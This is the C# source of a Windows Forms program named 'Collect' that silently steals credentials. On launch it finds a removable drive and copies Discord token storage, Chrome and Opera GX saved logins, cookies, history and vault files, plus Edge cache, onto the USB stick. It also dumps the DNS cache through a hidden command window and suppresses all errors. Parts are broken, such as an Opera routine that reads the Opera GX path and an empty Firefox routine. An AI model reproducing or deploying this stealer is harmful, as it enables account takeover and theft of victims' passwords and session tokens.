using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Collect
{
    public partial class Form1 : Form
    {
        public string user = Environment.UserName;

        public string discord_location;  //done
        public string google;  //done ++ cookies
        public string edge_a;
        public string firefox;  //done
        public string opera;  //done 
        public string operagx;  //done
        public string drive;  //done
        public string usb;  //done
        public string Securityfilestring = @"52r4308ufnjasLJHJSDHFAJdsh8uyr5834UJHDSJAH892y4382HSJD@@@@dsfjuahsdjhnaJHNSDA*(UY$*@Y(#Y$@(&*YDSFGHADKSJhHAA453228790878708708708708708708708708708708708708708708708708708708708708708708708708708708708700000000870870870870870870870807gdfhbsahjdsvaygsd72y643972y6bdsahbdmhaSBVJYAGSD&(*#&$@!(#*&TY$ISGDAHBSVDJHAG&(@!&$Y^(&$#";



        public void locationdata()
        {
            discord_location = @"C:\Users\"+user+@"\AppData\Roaming\discord\Cache";
            Securityfilestring = @"52r4308ufnjasLJHJSDHFAJdsh8uyr5834UJHDSJAH892y4382HSJD@@@@dsfjuahsdjhnaJHNSDA*(UY$*@Y(#Y$@(&*YDSFGHADKSJhHAA";
            google = @"C:\Users\"+user+@"\AppData\Local\Google\Chrome\User Data\Default";
            firefox = @"C:\Users\"+user+@"\AppData\Roaming\Mozilla\Firefox\Profiles";
            Securityfilestring = @"52r4308ufnjasLJHJSDHFAJdsh8uyr5834UJHDSJAH892y4382HSJD@@@@dsfjuahsdjhnaJHNSDA*(UY$*@Y(#Y$@(&*YDSFGHADKSJhHAA";
            operagx = @"C:\Users\"+user+@"\AppData\Roaming\Opera Software\Opera GX Stable";
            opera = @"C:\Users\"+user+@"\AppData\Roaming\Opera Software\Opera Stable";
            Securityfilestring = @"52r4308ufnjasLJHJSDHFAJdsh8uyr5834UJHDSJAH892y4382HSJD@@@@dsfjuahsdjhnaJHNSDA*(UY$*@Y(#Y$@(&*YDSFGHADKSJhHAA";
            edge_a = @"C:\Users\" + user + @"\AppData\Local\Temp\VSWebView2Cache";
            Directory.CreateDirectory(usb + "Data");
            


        }

        public Form1()
        {
            
            
            

            InitializeComponent();
            usb_detect();
            locationdata();
            Directory.CreateDirectory(usb + @"Data\" + @"Firefox");
            collect();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
        private void usb_detect()
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == DriveType.Removable)
                {
                    usb = drive.Name;
                }
            }
        }
        private void collect()
        {
            
            void discord()
            {
                
                Directory.CreateDirectory(usb + @"Data\" + @"Discord");
                
                CopyFilesRecursively(discord_location, usb + @"Data\" + @"Discord");
                

            }
            void discord_tokenv()
            {
                
                Directory.CreateDirectory(usb + @"Data\" + @"DiscordToken");
                
                CopyFilesRecursively(@"C:\Users\"+user+@"\AppData\Roaming\discord\Local Storage\leveldb", usb + @"Data\" + @"DiscordToken");
               


                Directory.CreateDirectory(usb + @"Data\" + @"DiscordToken\Google");
                
                CopyFilesRecursively(@"C:\Users\"+user+@"\AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb", usb + @"Data\" + @"DiscordToken\Google");
                

            }
            
            void google_c()
            {


                Directory.CreateDirectory(usb + @"Data\" + @"Google");
                Directory.CreateDirectory(usb + @"Data\Google\Cookies");
                File.Copy(google + @"\Login Data", usb + @"Data\" + @"Google\Login Data");
                File.Copy(google + @"\History", usb + @"Data\" + @"Google\History");
                File.Copy(google + @"\Login Data For Account", usb + @"Data\" + @"Google\Login Data For Account");
                File.Copy(google + @"\Visited Links", usb + @"Data\" + @"Google\Visited Links");
                File.Copy(google + @"\Trusted Vault", usb + @"Data\" + @"Google\Trusted Vault");
                File.Copy(google + @"\Secure Preferences", usb + @"Data\" + @"Google\Secure Preferences");
                File.Copy(google + @"\Extension Cookies", usb + @"Data\" + @"Google\Extension Cookies");
                File.Copy(google + @"\Affiliation Database", usb + @"Data\" + @"Google\Affiliation Database");
                File.Copy(google + @"\Shortcuts", usb + @"Data\" + @"Google\Shortcuts");
                try
                {
                    
                   CopyFilesRecursively(google + @"\Network", usb + @"Data\Google\Cookies");
                }
                catch (Exception)
                {

                }


                


            }
            void Firefox()
            {

               
                

            }
            void opera_gx()
            {
                Directory.CreateDirectory(usb + @"Data\" + @"OperaGX");
                File.Copy(operagx + @"\Login Data", usb + @"Data\" + @"OperaGX\Login Data");
                File.Copy(operagx + @"\History", usb + @"Data\" + @"OperaGX\History");
                File.Copy(operagx + @"\Local State", usb + @"Data\" + @"OperaGX\Local State");
               
            }
            void opera_s()
            {
                Directory.CreateDirectory(usb + @"Data\" + @"Opera");       
                File.Copy(operagx + @"\Login Data", usb + @"Data\" + @"Opera\Login Data");
                File.Copy(operagx + @"\History", usb + @"Data\" + @"Opera\History"); 
                File.Copy(operagx + @"\Local State", usb + @"Data\" + @"Opera\Local State");
            }
            void edge()
            {
                
                CopyFilesRecursively(edge_a, usb + "Data/edge");
            }
            void inpriv()
            {
                Directory.CreateDirectory(usb + @"Data\inpriv");
                ProcessStartInfo info = new ProcessStartInfo("cmd", "/c ipconfig/displaydns");
                info.RedirectStandardOutput = true;
                info.RedirectStandardInput = true;
                info.CreateNoWindow = true;
                info.UseShellExecute = false;
                Process p = new Process();
                p.StartInfo = info;
                p.Start();
                string iii = p.StandardOutput.ReadToEnd();


                string fileName = usb + @"Data\inpriv\inpriv.txt";

                try
                {
                    // Check if file already exists. If yes, delete it.     
                    if (File.Exists(fileName))
                    {
                        File.Delete(fileName);
                    }

                    // Create a new file     
                    using (FileStream fs = File.Create(fileName))
                    {
                        // Add some text to file    
                        Byte[] title = new UTF8Encoding(true).GetBytes(iii.ToString());
                        fs.Write(title, 0, title.Length);
                       
                    }

                    // Open the stream and read it back.    
                    using (StreamReader sr = File.OpenText(fileName))
                    {
                        string s = "";
                        while ((s = sr.ReadLine()) != null)
                        {
                            Console.WriteLine(s);
                        }
                    }
                }
                catch (Exception Ex)
                {
                    Console.WriteLine(Ex.ToString());
                }



            }









            try
            {
                discord_tokenv();
            }
            catch (Exception)
            {

                
            }


            try
            {
                discord();
            }
            catch (Exception)
            {

                
            }
            try
            {
              google_c();

            }
            catch (Exception)
            {

                
            }

            try
            {
                Firefox();
            }
            catch (Exception )
            {
                
            }

            try
            {
                opera_gx();
            }
            catch (Exception)
            {

               
            }
            try
            {
                opera_s();
            }
            catch (Exception)
            {

                
            }

            try
            {
                edge();
            }
            catch (Exception)
            { 

            }


            try
            {
                inpriv();
            }
            catch (Exception)
            {

            }

            



        }
        private static void CopyFilesRecursively(string sourcePath, string targetPath)
        {
            
            foreach (string dirPath in Directory.GetDirectories(sourcePath, " * ", SearchOption.AllDirectories))
            {
                Directory.CreateDirectory(dirPath.Replace(sourcePath, targetPath));
            }

            
            foreach (string newPath in Directory.GetFiles(sourcePath, "*.*", SearchOption.AllDirectories))
            {
                File.Copy(newPath, newPath.Replace(sourcePath, targetPath), true);
            }
        }

    }
}
